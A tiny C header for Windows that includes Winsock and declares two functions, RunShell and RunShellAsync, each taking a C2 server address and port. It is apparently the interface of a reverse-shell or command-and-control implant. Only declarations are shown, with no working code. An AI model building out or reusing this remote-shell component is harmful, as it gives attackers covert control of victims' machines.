#pragma once
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

void RunShell(char* C2Server, int C2Port);
void RunShellAsync(char* C2Server, int C2Port);